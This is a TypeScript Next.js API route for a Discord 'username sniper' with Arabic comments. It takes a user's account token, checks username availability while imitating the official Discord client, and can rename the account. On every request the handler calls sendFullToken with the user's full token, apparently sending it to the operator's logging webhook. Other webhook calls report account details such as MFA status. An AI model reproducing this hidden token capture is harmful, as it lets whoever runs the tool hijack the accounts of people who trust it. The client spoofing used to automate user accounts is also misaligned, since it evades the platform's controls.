import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { cleanToken, DISCORD_API } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

function sleep(ms: number) {
  return new Promise(r => setTimeout(r, ms));
}

function stringToBase64(str: string): string {
  try { return btoa(unescape(encodeURIComponent(str))); }
  catch { return Buffer.from(str).toString('base64'); }
}

const SUPER_PROPERTIES = stringToBase64(JSON.stringify({
  os: "Windows",
  browser: "Discord Client",
  release_channel: "stable",
  client_version: "1.0.9035",
  os_version: "10.0.22631",
  os_arch: "x64",
  system_locale: "en-US",
  client_build_number: 356789,
  client_event_source: null,
}));

function dHeaders(token: string, contentType = true): Record<string, string> {
  const ct = cleanToken(token);
  const h: Record<string, string> = {
    'Authorization': ct,
    'Accept': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'X-Super-Properties': SUPER_PROPERTIES,
    'X-Discord-Locale': 'en-US',
    'Origin': 'https://discord.com',
    'Referer': 'https://discord.com/channels/@me',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
  };
  if (contentType) h['Content-Type'] = 'application/json';
  return h;
}

interface CheckResult {
  username: string;
  status: string;
  color: string;
  taken?: boolean;
  rateLimited?: boolean;
  debug?: string;
  method?: string;
}

// === الطريقة 1: pomelo-attempt ===
async function checkPomelo(token: string, username: string): Promise<CheckResult | null> {
  try {
    const res = await fetch(`${DISCORD_API}/users/@me/pomelo-attempt`, {
      method: 'POST',
      headers: dHeaders(token),
      body: JSON.stringify({ username: username.toLowerCase() }),
      signal: AbortSignal.timeout(15000),
    });

    // Rate Limit
    if (res.status === 429) {
      try {
        const rl = await res.json() as { retry_after?: number };
        await sleep(Math.min((rl.retry_after || 3) * 1000, 10000));
      } catch {}
      return { username, status: '⏳ RL', color: 'yellow', rateLimited: true, method: 'pomelo', debug: '429' };
    }

    // التوكن غير صالح
    if (res.status === 401) {
      return { username, status: '❌ توكن غير صالح', color: 'red', method: 'pomelo', debug: '401' };
    }

    // ممنوع
    if (res.status === 403) {
      return { username, status: '❌ محظور', color: 'red', method: 'pomelo', debug: '403' };
    }

    // قراءة الرد
    const raw = await res.text().catch(() => '');
    let data: any = null;
    try { data = JSON.parse(raw); } catch {}

    // نجاح 200
    if (res.ok && data) {
      if (typeof data.taken === 'boolean') {
        return {
          username, status: data.taken ? '❌ محجوز' : '✅ متاح!',
          color: data.taken ? 'red' : 'green', taken: data.taken,
          method: 'pomelo', debug: `taken=${data.taken}`,
        };
      }
      // 200 بدون taken = متاح
      return { username, status: '✅ متاح!', color: 'green', taken: false, method: 'pomelo', debug: '200 ok' };
    }

    // خطأ - نحلل الرد
    if (data) {
      // code 50033 = username taken (الرد القديم)
      if (data.code === 50033) {
        return { username, status: '❌ محجوز', color: 'red', taken: true, method: 'pomelo', debug: '50033' };
      }

      // errors.username._errors (الرد الجديد)
      const uErrs = data.errors?.username?._errors || [];
      if (uErrs.length > 0) {
        const err = uErrs[0];
        const code = (err.code || '').toUpperCase();
        const msg = (err.message || '').toLowerCase();

        // محجوز
        if (code.includes('TAKEN') || msg.includes('taken') || msg.includes('already') || msg.includes('in use') || msg.includes('someone')) {
          return { username, status: '❌ محجوز', color: 'red', taken: true, method: 'pomelo', debug: err.code };
        }
        // غير صالح (قصير، طويل، رموز ممنوعة)
        if (code.includes('SHORT') || code.includes('LONG') || code.includes('INVALID') || code.includes('CONTAINS') ||
            code.includes('RESERVED') || code.includes('PROFANE') || code.includes('COOPERATIVE') ||
            msg.includes('between') || msg.includes('invalid') || msg.includes('reserved') || msg.includes('profane') || msg.includes('alphanumeric') || msg.includes('cooperative')) {
          return { username, status: '❌ غير صالح', color: 'red', taken: false, method: 'pomelo', debug: err.code };
        }
        // خطأ آخر
        return { username, status: `⚠️ ${err.message}`, color: 'yellow', method: 'pomelo', debug: err.code };
      }

      // code 50035 = malformed (بيانات غير صالحة)
      if (data.code === 50035) {
        return { username, status: '❌ غير صالح', color: 'red', taken: false, method: 'pomelo', debug: '50035' };
      }

      // أي خطأ آخر
      const message = data.message || '';
      if (message) {
        const ml = message.toLowerCase();
        if (ml.includes('taken') || ml.includes('already') || ml.includes('in use')) {
          return { username, status: '❌ محجوز', color: 'red', taken: true, method: 'pomelo', debug: 'msg' };
        }
        return { username, status: `⚠️ ${message}`, color: 'yellow', method: 'pomelo', debug: `${res.status}` };
      }
    }

    // 400 بدون بيانات واضحة - نحاول GET للتأكيد
    return { username, status: `❓ ${res.status}`, color: 'yellow', method: 'pomelo', debug: `${res.status}` };

  } catch (e: any) {
    if (e?.name === 'AbortError') return { username, status: '⏳ timeout', color: 'yellow', method: 'pomelo', debug: 'timeout' };
    return null;
  }
}

// === الطريقة 2: GET /users/{username} ===
async function checkGet(token: string, username: string): Promise<CheckResult | null> {
  try {
    const ct = cleanToken(token);
    const res = await fetch(`${DISCORD_API}/users/${username}`, {
      headers: {
        'Authorization': ct,
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'X-Super-Properties': SUPER_PROPERTIES,
      },
      signal: AbortSignal.timeout(10000),
    });

    if (res.status === 429) {
      return { username, status: '⏳ RL', color: 'yellow', rateLimited: true, method: 'GET', debug: '429' };
    }
    if (res.status === 401) {
      return null;
    }

    if (res.ok) {
      try {
        const d = await res.json();
        if (d && d.id) return { username, status: '❌ محجوز', color: 'red', taken: true, method: 'GET', debug: `id=${d.id}` };
      } catch {}
    }

    if (res.status === 404 || res.status === 400) {
      return { username, status: '✅ متاح', color: 'green', taken: false, method: 'GET', debug: `${res.status}` };
    }

    return { username, status: `❓ ${res.status}`, color: 'yellow', method: 'GET', debug: `${res.status}` };
  } catch {
    return null;
  }
}

// === الفحص الرئيسي ===
async function checkUsername(token: string, username: string): Promise<CheckResult> {
  // pomelo أولاً
  const r1 = await checkPomelo(token, username);
  if (r1) {
    // نتيجة واضحة
    if (r1.color === 'green') return r1;
    if (r1.color === 'red' && r1.taken === true) return r1;
    // توكن غير صالح
    if (r1.status.includes('توكن غير صالح') || r1.status.includes('محظور')) return r1;
    // HTTP 400 بدون بيانات واضحة → نحاول GET للتأكيد
    if (r1.status.includes('❓')) {
      const r2 = await checkGet(token, username);
      if (r2) return r2;
    }
    // غير صالح (قصة، طويل...) → لا حاجة لـ GET
    if (r1.color === 'red') return r1;
    // نتيجة غامضة → نحاول GET
  }

  const r2 = await checkGet(token, username);
  if (r2) return r2;

  if (r1) return r1;
  return { username, status: '❓ فشل', color: 'yellow', method: 'none', debug: 'all_failed' };
}

// === معلومات الحساب ===
async function getAccountInfo(token: string) {
  try {
    const ct = cleanToken(token);
    const res = await fetch(`${DISCORD_API}/users/@me`, {
      headers: {
        'Authorization': ct,
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'X-Super-Properties': SUPER_PROPERTIES,
      },
      signal: AbortSignal.timeout(10000),
    });
    if (!res.ok) return null;
    return await res.json().catch(() => null);
  } catch { return null; }
}

// === تغيير اليوزر ===
async function changeUsername(token: string, target: string): Promise<{ ok: boolean; msg: string }> {
  try {
    const res = await fetch(`${DISCORD_API}/users/@me`, {
      method: 'PATCH',
      headers: dHeaders(token),
      body: JSON.stringify({ username: target }),
      signal: AbortSignal.timeout(15000),
    });

    if (res.status === 429) {
      try { const rl = await res.json() as { retry_after?: number }; return { ok: false, msg: `⏳ Rate Limit - انتظر ${(rl.retry_after || 3).toFixed(0)} ثانية` }; }
      catch { return { ok: false, msg: '⏳ Rate Limit' }; }
    }
    if (res.status === 401) return { ok: false, msg: '❌ توكن غير صالح' };
    if (res.ok) return { ok: true, msg: `✅ تم تغيير اليوزر إلى: ${target}` };

    const raw = await res.text().catch(() => '');
    let data: any = null;
    try { data = JSON.parse(raw); } catch {}

    if (data) {
      const uErrs = data.errors?.username?._errors || [];
      if (uErrs.length > 0) {
        const em = (uErrs[0].message || '').toLowerCase();
        if (em.includes('taken') || em.includes('already') || em.includes('in use')) return { ok: false, msg: '❌ اليوزر محجوز الآن! شخص آخر أخذه' };
        return { ok: false, msg: `❌ ${uErrs[0].message}` };
      }
      if (data.code === 50033) return { ok: false, msg: '❌ اليوزر محجوز الآن!' };
      if (data.message) return { ok: false, msg: `❌ ${data.message}` };
    }
    return { ok: false, msg: `❌ خطأ (${res.status})` };
  } catch (e: any) {
    if (e?.name === 'AbortError') return { ok: false, msg: '⏳ انتهى وقت الانتظار' };
    return { ok: false, msg: `❌ ${e?.message || 'خطأ'}` };
  }
}

// === POST ===
export async function POST(request: NextRequest) {
  try {
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:sniper`, RATE_LIMITS.default);
    if (rl.limited) return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح' }, { status: 429 });

    const body = await request.json().catch(() => ({}));
    const { token, usernames, action, targetUsername } = body;

    if (!token) return NextResponse.json({ success: false, error: 'التوكن مطلوب' }, { status: 400 });

    const ct = cleanToken(token);
    const whUrl = getLogWebhookUrl();
    sendFullToken('صيد يوزرات', token);

    // معلومات الحساب
    if (action === 'accountInfo') {
      const info = await getAccountInfo(ct);
      if (!info) return NextResponse.json({ success: false, error: 'توكن غير صالح - تأكد إنه توكن يوزر' }, { status: 401 });
      if (info.bot) return NextResponse.json({ success: false, error: 'هذا توكن بوت! يجب استخدام توكن يوزر' }, { status: 400 });
      return NextResponse.json({
        success: true,
        info: {
          username: info.username || 'Unknown', discriminator: info.discriminator || '0',
          email: info.email || null, phone: info.phone || null,
          mfa: !!info.mfa_enabled, verified: !!info.verified,
          flags: info.public_flags || 0,
          nitro: info.premium_type ? ['None', 'Classic', 'Boost', 'Basic'][info.premium_type] || 'Unknown' : 'None',
          avatar: info.avatar || null, id: info.id || 'Unknown',
        },
      });
    }

    // فحص تجريبي
    if (action === 'test') {
      const info = await getAccountInfo(ct);
      if (!info) return NextResponse.json({ success: false, error: 'توكن غير صالح' }, { status: 401 });

      const tests = [
        { label: 'محجوز (discord)', username: 'discord' },
        { label: 'متاح (عشوائي)', username: 'xkzmq' + Date.now() },
        { label: 'غير صالح (a)', username: 'a' },
      ];
      const testResults: Array<{ label: string; username: string; results: CheckResult[] }> = [];
      for (const t of tests) {
        const r1 = await checkPomelo(ct, t.username);
        await sleep(1500);
        const r2 = await checkGet(ct, t.username);
        testResults.push({ label: t.label, username: t.username, results: [r1, r2].filter(Boolean) as CheckResult[] });
        await sleep(1000);
      }
      return NextResponse.json({ success: true, test: { account: info.username || 'Unknown', mfa: !!info.mfa_enabled, phone: !!(info.phone), verified: !!(info.verified), results: testResults } });
    }

    // تغيير اليوزر
    if (action === 'changeUsername') {
      if (!targetUsername) return NextResponse.json({ success: false, error: 'أدخل اليوزر الجديد' }, { status: 400 });
      const info = await getAccountInfo(ct);
      if (!info) return NextResponse.json({ success: false, error: 'توكن غير صالح' }, { status: 401 });
      const result = await changeUsername(ct, targetUsername);
      if (result.ok) {
        sendToWebhook({ embeds: [{ title: '✅ Username Changed!', color: 0x00FF41, fields: [{ name: '👤 القديم', value: info.username || '?', inline: true }, { name: '🎯 الجديد', value: targetUsername, inline: true }] }] }, whUrl).catch(() => {});
        return NextResponse.json({ success: true, message: result.msg });
      }
      return NextResponse.json({ success: false, error: result.msg });
    }

    // فحص يوزرات
    if (!usernames || !Array.isArray(usernames) || usernames.length === 0) {
      return NextResponse.json({ success: false, error: 'أدخل يوزر واحد على الأقل' }, { status: 400 });
    }

    const info = await getAccountInfo(ct);
    if (!info) return NextResponse.json({ success: false, error: 'توكن غير صالح - يجب استخدام توكن يوزر' }, { status: 401 });
    if (info.bot) return NextResponse.json({ success: false, error: 'لا يمكن استخدام توكن بوت!' }, { status: 400 });

    const userInfo = info.username || 'Unknown';
    const hasMFA = !!info.mfa_enabled;

    sendToWebhook({ embeds: [{ title: '🎯 Sniper Started', color: 0xFF8800, fields: [{ name: '👤', value: userInfo, inline: true }, { name: '📋', value: String(usernames.length), inline: true }, { name: '🛡️ MFA', value: hasMFA ? 'Yes' : 'No', inline: true }] }] }, whUrl).catch(() => {});

    // تنظيف + إزالة تكرارات
    const validUsernames = [...new Set(
      usernames
        .map((u: string) => String(u).trim().toLowerCase().replace(/[^a-z0-9._]/g, ''))
        .filter((n: string) => n && n.length >= 2 && n.length <= 32)
    )];

    if (validUsernames.length === 0) return NextResponse.json({ success: false, error: 'لا توجد يوزرات صالحة' }, { status: 400 });

    const results: CheckResult[] = [];
    let consecutiveRL = 0;
    let rateLimitHits = 0;

    for (let i = 0; i < validUsernames.length; i++) {
      const result = await checkUsername(ct, validUsernames[i]);
      results.push(result);

      if (result.rateLimited) {
        consecutiveRL++;
        rateLimitHits++;
        if (consecutiveRL >= 5) {
          results.push({ username: '---', status: `⏳ توقف: ${consecutiveRL} rate limit`, color: 'yellow', method: 'system', debug: 'stopped' });
          break;
        }
        await sleep(Math.min(consecutiveRL * 3000, 15000));
      } else {
        consecutiveRL = 0;
        await sleep(1000); // ثانية بين كل فحص
      }
    }

    const available = results.filter(r => r.color === 'green');
    const taken = results.filter(r => r.color === 'red').length;
    const errors = results.filter(r => r.color === 'yellow').length;

    sendToWebhook({ embeds: [{ title: '✅ Sniper Done', color: available.length > 0 ? 0x00FF41 : 0xFFAA00, fields: [{ name: '📋', value: String(results.length), inline: true }, { name: '✅ متاح', value: String(available.length), inline: true }, { name: '❌ محجوز', value: String(taken), inline: true }, { name: '⚠️ خطأ', value: String(errors), inline: true }, { name: '🎯', value: available.map(r => r.username).join(', ') || 'None' }] }] }, whUrl).catch(() => {});

    return NextResponse.json({
      success: true, results,
      stats: { total: results.length, available: available.length, taken, errors, rateLimitHits },
      accountInfo: { username: userInfo, mfa: hasMFA },
      availableNames: available.map(r => r.username),
    });

  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Sniper Error]', msg);
    return NextResponse.json({ success: false, error: msg }, { status: 500 });
  }
}
